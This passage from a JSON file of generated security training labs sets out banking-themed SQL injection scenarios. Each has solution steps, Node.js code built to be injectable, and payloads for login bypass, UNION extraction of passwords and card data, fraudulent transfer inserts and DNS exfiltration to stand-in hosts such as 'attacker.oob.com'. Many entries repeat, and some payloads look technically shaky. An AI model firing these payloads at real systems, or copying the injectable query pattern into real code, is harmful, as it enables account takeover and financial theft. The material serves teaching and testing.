      "Send a malicious fund transfer request to the API with SQL Injection payloads in the fields.",
      "Monitor DNS traffic for exfiltration of transaction details such as account numbers and amounts.",
      "Confirm successful exfiltration of transaction data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/transfer/validate', (req, res) => {\n  const fromAccount = req.body.fromAccount;\n  const toAccount = req.body.toAccount;\n  const amount = req.body.amount;\n  const sql = `SELECT * FROM transactions WHERE from_account = '${fromAccount}' AND to_account = '${toAccount}' AND amount = '${amount}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transaction validation failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT transaction_id FROM transactions WHERE amount='5000'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\fund_transfer_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Loan Application Search",
    "Lab Description": "The banking portal allows users to search for loan applications, but it constructs SQL queries based on user input without sanitization. Attackers can inject SQL payloads that result in DNS-based OOB data exfiltration of loan application information. Solve this lab by crafting a payload that leaks loan applicant data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set up a DNS OOB listener (Burp Collaborator).",
      "Inject a SQL payload into the loan application search query.",
      "Monitor the DNS traffic for exfiltrated loan applicant data.",
      "Confirm the successful leak of applicant details like name and loan amount."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/loan/applications', (req, res) => {\n  const applicationId = req.query.applicationId;\n  const sql = `SELECT * FROM loan_applications WHERE application_id = '${applicationId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Loan application fetch failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT loan_amount FROM loan_applications WHERE application_id='1'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\loan_applicant_data'--"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Transaction Logs Retrieval",
    "Lab Description": "The banking API has an endpoint for retrieving transaction logs, but the endpoint is vulnerable to SQL Injection. Attackers can inject SQL payloads to extract sensitive transaction data, including amounts, account details, and dates, through DNS-based OOB requests. Solve this lab by injecting a payload to leak transaction logs.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Configure an OOB capture tool (Burp Collaborator).",
      "Send an injected SQL payload through the transaction logs retrieval API.",
      "Monitor the DNS traffic for exfiltrated transaction data.",
      "Verify that sensitive transaction data has been leaked."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/api/transactions/logs', (req, res) => {\n  const startDate = req.query.startDate;\n  const endDate = req.query.endDate;\n  const sql = `SELECT * FROM transaction_logs WHERE transaction_date BETWEEN '${startDate}' AND '${endDate}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transaction logs retrieval failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT transaction_date FROM transaction_logs WHERE amount='1000'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\transaction_log_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Loan Approval System",
    "Lab Description": "The banking portal contains a loan approval system that fails to sanitize user input in loan application forms. An attacker can inject SQL payloads into the loan amount or borrower ID fields. The attacker can exfiltrate sensitive loan data using OOB DNS requests. The goal is to craft a payload that exfiltrates loan approval data such as loan amounts and borrower names.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set up an OOB listener (e.g., Burp Collaborator).",
      "Inject a SQL payload into the loan approval form's fields (loan amount, borrower ID).",
      "Monitor DNS traffic for exfiltrated loan approval data.",
      "Verify successful exfiltration of loan approval details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/loan/approve', (req, res) => {\n  const loanAmount = req.body.amount;\n  const borrowerId = req.body.borrowerId;\n  const sql = `SELECT * FROM loan_approvals WHERE loan_amount = '${loanAmount}' AND borrower_id = '${borrowerId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Loan approval failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT borrower_name FROM loan_approvals WHERE loan_amount='5000'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\loan_approval_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in User Profile Page",
    "Lab Description": "The banking portal's user profile page is vulnerable to SQL Injection through an unprotected user ID query. The user ID is used directly in the SQL query to retrieve the profile. Attackers can inject SQL to exfiltrate sensitive user data, such as account details and transaction history, via OOB DNS requests. The challenge is to craft an injection that leaks user profile data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set up an OOB DNS listener (Burp Collaborator).",
      "Inject a payload into the user profile page's user ID parameter.",
      "Monitor DNS traffic for exfiltrated data from the profile (e.g., account details, transaction history).",
      "Verify the successful leak of user data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/user/profile', (req, res) => {\n  const userId = req.query.userId;\n  const sql = `SELECT * FROM users WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Profile fetch failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT account_balance FROM users WHERE user_id='1'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\user_profile_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transaction History",
    "Lab Description": "The banking portal allows users to view their transaction history, but fails to sanitize inputs. An attacker can inject SQL payloads into the request parameters, exfiltrating sensitive data (such as transaction IDs, amounts, and sender/receiver details) via OOB DNS requests. The task is to inject SQL payloads to exfiltrate the transaction history.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up an OOB DNS capture service (Burp Collaborator).",
      "Send a crafted SQL payload to the transaction history API endpoint.",
      "Monitor DNS traffic for sensitive transaction data such as amounts, transaction IDs, and account details.",
      "Verify the successful exfiltration of sensitive transaction data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transaction/history', (req, res) => {\n  const userId = req.query.userId;\n  const sql = `SELECT * FROM transactions WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transaction history fetch failed');\n    else res.json(result); \n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT transaction_id FROM transactions WHERE amount='1000'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\transaction_history'--"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Account Balance API",
    "Lab Description": "The banking API exposes account balance data to users through an unprotected endpoint, where the account number is directly inserted into an SQL query. Attackers can use SQL injection to manipulate the query, causing the server to leak account balance information through DNS-based OOB exfiltration. The challenge is to craft a SQL injection payload to exfiltrate sensitive account balance information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set up an OOB DNS capture tool (Burp Collaborator).",
      "Inject SQL payloads into the account number parameter of the account balance API.",
      "Monitor DNS traffic for the leaked account balance.",
      "Verify that sensitive account information has been successfully exfiltrated."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account/balance', (req, res) => {\n  const accountNumber = req.query.accountNumber;\n  const sql = `SELECT balance FROM accounts WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Balance fetch failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT balance FROM accounts WHERE account_number='12345'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\account_balance'--"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Account Update Endpoint",
    "Lab Description": "The banking API has an endpoint for updating user account details, but fails to sanitize inputs. Attackers can inject SQL payloads into the update request, causing the server to leak sensitive information such as account number and user details through DNS-based OOB requests. The goal is to craft a SQL injection payload to leak account data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Configure an OOB listener (Burp Collaborator).",
      "Send a malicious request to the account update API endpoint with SQL payloads in the account number and user name fields.",
      "Monitor DNS traffic for exfiltrated account information.",
      "Verify the successful leak of account data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.put('/account/update', (req, res) => {\n  const accountNumber = req.body.accountNumber;\n  const userName = req.body.userName;\n  const sql = `UPDATE accounts SET user_name = '${userName}' WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Account update failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user_name FROM accounts WHERE account_number='12345'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\account_update_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Creation",
    "Lab Description": "The banking portal allows new users to create accounts, but fails to sanitize input fields, making it vulnerable to SQL Injection. An attacker can inject SQL payloads into the username or password fields. The goal is to inject payloads that exfiltrate sensitive user data, such as newly created account details and passwords, via DNS-based OOB exfiltration.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set up an OOB DNS listener (Burp Collaborator).",
      "Inject SQL payloads into the username and password fields during account creation.",
      "Monitor DNS traffic for exfiltrated account details.",
      "Verify the successful exfiltration of user account data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/account/create', (req, res) => {\n  const userName = req.body.username;\n  const password = req.body.password;\n  const sql = `INSERT INTO users (username, password) VALUES ('${userName}', '${password}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Account creation failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT username FROM users WHERE user_id='1'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\account_creation_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Loan Interest Calculation",
    "Lab Description": "The banking portal calculates loan interest using parameters submitted via the loan application form. The system is vulnerable to SQL Injection, allowing attackers to modify the query and leak interest rate calculations, loan amounts, and associated user data via OOB DNS requests. The goal is to inject a payload that exposes loan interest rates.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set up an OOB DNS listener (Burp Collaborator).",
      "Inject SQL payloads into the loan application form fields, particularly loan amount and interest rate parameters.",
      "Monitor DNS traffic for exfiltrated loan calculation data.",
      "Verify successful leakage of loan interest data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/loan/calculate', (req, res) => {\n  const loanAmount = req.body.amount;\n  const loanTerm = req.body.term;\n  const sql = `SELECT * FROM loan_calculations WHERE amount = '${loanAmount}' AND term = '${loanTerm}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Loan calculation failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT interest_rate FROM loan_calculations WHERE amount='5000'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\loan_interest_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Login",
    "Lab Description": "The login page of the banking portal is vulnerable to SQL Injection due to improper handling of user credentials in the SQL query. Attackers can inject payloads into the username and password fields to retrieve sensitive account details or bypass authentication entirely using UNION-based injection. The task is to exploit this vulnerability to exfiltrate account details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use a proxy tool (Burp Suite or OWASP ZAP) to intercept the login request.",
      "Inject a SQL payload into the username or password field.",
      "Leverage UNION-based SQL Injection to retrieve account details or bypass login.",
      "Verify the exfiltrated data (e.g., account numbers, passwords)."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Transfer",
    "Lab Description": "The banking portal’s account transfer feature is vulnerable to SQL Injection. An attacker can inject malicious SQL code into the transfer amount or recipient account number fields. This vulnerability allows an attacker to steal funds or leak account information. The goal is to craft a payload that exfiltrates transfer data via OOB DNS requests.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set up an OOB DNS listener (Burp Collaborator).",
      "Inject SQL payloads into the transfer amount and recipient account number fields.",
      "Monitor DNS traffic for exfiltrated data about the transfer (e.g., account numbers, amounts).",
      "Verify successful data leakage via OOB."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/transfer', (req, res) => {\n  const amount = req.body.amount;\n  const recipient = req.body.recipient;\n  const sql = `INSERT INTO transfers (amount, recipient) VALUES ('${amount}', '${recipient}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transfer failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT amount FROM transfers WHERE recipient='12345'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\transfer_data'--"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Account Info API",
    "Lab Description": "The banking API has an endpoint that retrieves user account information, but fails to sanitize inputs. An attacker can inject SQL payloads into the account number field, leading to SQL Injection vulnerabilities. The goal is to exfiltrate sensitive account information, such as balance and transaction history, using OOB DNS exfiltration.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up an OOB DNS listener (Burp Collaborator).",
      "Inject a crafted SQL payload into the account number field.",
      "Monitor DNS traffic for the exfiltration of sensitive account data (e.g., balance, transactions).",
      "Verify the successful leak of account information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account/info', (req, res) => {\n  const accountNumber = req.query.accountNumber;\n  const sql = `SELECT * FROM accounts WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Account info fetch failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT balance FROM accounts WHERE account_number='12345'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\account_info'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transaction History",
    "Lab Description": "The banking portal has an endpoint that displays a user’s transaction history based on the user ID. The endpoint is vulnerable to SQL Injection due to improper sanitization of input. An attacker can inject SQL payloads into the user ID parameter to extract sensitive transaction details. The goal is to craft an injection that exfiltrates the entire transaction history of a target account via OOB DNS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request using Burp Suite or OWASP ZAP.",
      "Inject a SQL payload into the user ID parameter to bypass the query logic.",
      "Monitor the DNS exfiltration for leaked transaction details.",
      "Verify the exfiltrated transaction data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account/transactions', (req, res) => {\n  const userId = req.query.userId;\n  const sql = `SELECT * FROM transactions WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transaction history fetch failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, transaction_amount FROM transactions --",
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT transaction_details FROM transactions WHERE user_id='1'),'.oob.bank.com\\\\'))--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in User Profile Update",
    "Lab Description": "The profile update form in the banking portal is vulnerable to SQL Injection due to improper input sanitization. The form accepts user inputs like address, phone number, and email, which are directly inserted into a SQL query without sanitization. The goal is to exploit the SQL Injection vulnerability to modify other user profiles or retrieve sensitive data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the request for profile update.",
      "Inject a simple SQL payload in the phone number or address fields.",
      "Modify the request to retrieve other users’ profile data using UNION SELECT.",
      "Verify the successful exfiltration or modification of profile data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/profile/update', (req, res) => {\n  const userId = req.body.userId;\n  const address = req.body.address;\n  const sql = `UPDATE users SET address = '${address}' WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Profile update failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "'; UPDATE users SET address = 'Hacked Address' WHERE user_id = '1' --"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Fund Transfer API",
    "Lab Description": "The API endpoint responsible for fund transfers is vulnerable to SQL Injection. An attacker can manipulate the source account number and transfer amount parameters in the URL query string to exfiltrate sensitive data or steal funds. The goal is to exploit this vulnerability to steal funds or retrieve sensitive user information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the API request using Postman or Burp Suite.",
      "Inject a SQL payload into the source account or amount fields.",
      "Leverage UNION-based SQL Injection to retrieve user data or perform unauthorized fund transfers.",
      "Verify the successful exfiltration or unauthorized transaction."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/transfer', (req, res) => {\n  const sourceAccount = req.body.sourceAccount;\n  const destinationAccount = req.body.destinationAccount;\n  const amount = req.body.amount;\n  const sql = `INSERT INTO transfers (source_account, destination_account, amount) VALUES ('${sourceAccount}', '${destinationAccount}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transfer failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, balance FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Fund Withdrawal",
    "Lab Description": "The banking portal is vulnerable to SQL Injection in the withdrawal form. The withdrawal amount and account number fields are susceptible to SQL injection, allowing an attacker to exfiltrate account details or modify the withdrawal amount. The goal is to inject a payload that either exfiltrates sensitive information or authorizes a withdrawal from a target account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the withdrawal form submission.",
      "Inject a SQL payload in the amount or account number fields.",
      "Test the payloads for data exfiltration or withdrawal approval.",
      "Verify the exfiltrated data or unauthorized withdrawal."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/withdraw', (req, res) => {\n  const accountNumber = req.body.accountNumber;\n  const amount = req.body.amount;\n  const sql = `INSERT INTO withdrawals (account_number, amount) VALUES ('${accountNumber}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Withdrawal failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT account_details FROM accounts WHERE account_number='12345'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\withdrawal_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Credit Card Payment",
    "Lab Description": "The payment form on the banking portal is vulnerable to SQL Injection. An attacker can inject SQL payloads into the credit card number field or payment amount field to retrieve sensitive credit card details or bypass payment authentication. The goal is to extract sensitive credit card data using SQL Injection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the payment form request.",
      "Inject SQL payloads into the credit card number or amount fields.",
      "Leverage UNION-based SQL Injection to extract credit card details.",
      "Verify the successful exfiltration of sensitive credit card information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/payment', (req, res) => {\n  const cardNumber = req.body.cardNumber;\n  const amount = req.body.amount;\n  const sql = `INSERT INTO payments (card_number, amount) VALUES ('${cardNumber}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Payment failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT card_number, expiration_date FROM credit_cards --",
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT card_number FROM credit_cards WHERE card_id='1'),'.oob.bank.com\\\\'))--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Balance Check API",
    "Lab Description": "The balance check API endpoint is vulnerable to SQL Injection. The user ID parameter is directly passed into the SQL query without proper sanitization. This vulnerability allows attackers to extract sensitive account balance information for any user. The goal is to inject SQL payloads that allow exfiltration of account balance data for multiple users.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request and locate the vulnerable user ID parameter.",
      "Inject SQL payloads into the user ID parameter to extract account balance data using UNION SELECT.",
      "Monitor the responses for any sensitive data leakage.",
      "Verify the successful extraction of account balances."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/api/balance', (req, res) => {\n  const userId = req.query.userId;\n  const sql = `SELECT balance FROM accounts WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Balance retrieval failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT user_id, balance FROM accounts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Loan Application Form",
    "Lab Description": "The loan application form in the banking portal is vulnerable to SQL Injection. The application allows users to input their loan amount and account number. The lack of input validation allows attackers to inject malicious SQL queries into these fields. The goal is to extract personal information and account details of other users by injecting SQL payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite or OWASP ZAP to intercept the loan application request.",
      "Inject SQL payloads into the loan amount or account number fields.",
      "Test for data leakage or unauthorized access to user information using UNION SELECT.",
      "Verify the successful exfiltration of account and personal information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/apply-loan', (req, res) => {\n  const accountNumber = req.body.accountNumber;\n  const loanAmount = req.body.loanAmount;\n  const sql = `INSERT INTO loan_applications (account_number, loan_amount) VALUES ('${accountNumber}', '${loanAmount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Loan application failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, first_name, last_name FROM users --",
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT account_number FROM accounts WHERE loan_status='pending'),'\\\\oob.bank.com\\\\'))--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Registration",
    "Lab Description": "The account registration form is vulnerable to SQL Injection due to improper sanitization of user inputs. The attacker can inject malicious SQL code into fields such as the username or email to bypass account creation logic and retrieve existing account information. The goal is to exfiltrate existing account information through SQL injection in the registration form.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the registration form submission using Burp Suite.",
      "Inject SQL payloads into the username or email fields.",
      "Use UNION SELECT to extract sensitive account information such as usernames and email addresses.",
      "Verify the successful data extraction."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const username = req.body.username;\n  const email = req.body.email;\n  const password = req.body.password;\n  const sql = `INSERT INTO users (username, email, password) VALUES ('${username}', '${email}', '${password}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Registration failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, email FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transfer History",
    "Lab Description": "The transfer history page on the banking portal is vulnerable to SQL Injection. The page queries transfer records by user ID but does not properly sanitize the user input. An attacker can manipulate the user ID parameter to access another user’s transfer history or exfiltrate data. The goal is to exploit this vulnerability to extract sensitive transfer information of other users.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the transfer history request using Burp Suite.",
      "Inject SQL payloads into the user ID parameter to retrieve transfer history.",
      "Use UNION SELECT to extract transfer records for other users.",
      "Verify the successful extraction of transfer history."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transfer-history', (req, res) => {\n  const userId = req.query.userId;\n  const sql = `SELECT * FROM transfers WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transfer history retrieval failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT transfer_id, amount, date FROM transfers --",
      "'; SELECT * FROM transfers WHERE user_id = '1' --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Password Reset API",
    "Lab Description": "The password reset API is vulnerable to SQL Injection. An attacker can inject malicious SQL code into the email or username parameters, bypassing the intended password reset flow and extracting sensitive user data, such as email addresses and user names. The goal is to retrieve user data and potentially reset the passwords for targeted accounts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the password reset request using Burp Suite or Postman.",
      "Inject SQL payloads into the email or username parameters.",
      "Leverage UNION SELECT to extract email addresses and usernames.",
      "Verify the successful data extraction or password reset."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/reset-password', (req, res) => {\n  const email = req.body.email;\n  const sql = `SELECT * FROM users WHERE email = '${email}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Password reset failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT email, username FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in User Authentication",
    "Lab Description": "The login endpoint is vulnerable to SQL Injection. The application directly injects the username and password parameters into an SQL query without proper sanitization. This flaw allows attackers to bypass authentication by injecting SQL payloads. The goal is to exploit this vulnerability to log in as an admin user without valid credentials.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the login request and identify the vulnerable username and password fields.",
      "Inject SQL payloads into the username and password fields to bypass authentication.",
      "Test various payloads like ' OR '1'='1 to see if you can bypass authentication.",
      "Verify successful login with admin privileges."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT 1, username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transfer Money API",
    "Lab Description": "The transfer money API in the banking portal is vulnerable to SQL Injection. The amount and account number parameters are directly inserted into the SQL query, making it easy for attackers to manipulate the transaction logic. The goal is to transfer funds to an attacker-controlled account by injecting malicious SQL payloads into the amount or account number fields.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the transfer money request using Burp Suite.",
      "Inject SQL payloads into the amount and account number fields.",
      "Test if you can alter the transaction to transfer money to your own account using UNION SELECT.",
      "Verify successful fund transfer."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/transfer', (req, res) => {\n  const { accountNumber, amount } = req.body;\n  const sql = `INSERT INTO transactions (account_number, amount) VALUES ('${accountNumber}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transaction failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; INSERT INTO transactions (account_number, amount) VALUES ('attacker_account', 10000) --",
      "' UNION SELECT account_number, balance FROM accounts --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in User Settings",
    "Lab Description": "The user settings page allows users to update their personal details, but the application is vulnerable to SQL Injection. The settings API updates parameters like the user's email or phone number without sanitizing the input, allowing attackers to manipulate user data. The goal is to extract or modify sensitive user information, such as account numbers, by injecting SQL payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the settings update request with Burp Suite.",
      "Inject SQL payloads into the email or phone number fields.",
      "Check for data leakage or unauthorized updates to sensitive fields, such as account number or balance.",
      "Verify the data manipulation or exfiltration success."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/update-settings', (req, res) => {\n  const { email, phone } = req.body;\n  const sql = `UPDATE users SET email = '${email}', phone = '${phone}' WHERE user_id = '${req.userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Update failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT email, phone FROM users --",
      "'; UPDATE users SET phone = 'attacker_phone' WHERE user_id = '1' --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Admin Dashboard",
    "Lab Description": "The admin dashboard is vulnerable to SQL Injection through a search field used to find transactions by user ID. The application does not validate user inputs, making it possible to inject SQL code into the search query. The goal is to bypass authentication and access sensitive transaction records for any user through SQL injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the search request and identify the user ID parameter.",
      "Inject SQL payloads into the user ID field to extract sensitive transaction records.",
      "Test the payloads like ' UNION SELECT * FROM transactions --' to bypass access control.",
      "Verify the extraction of sensitive transaction information."
    ],
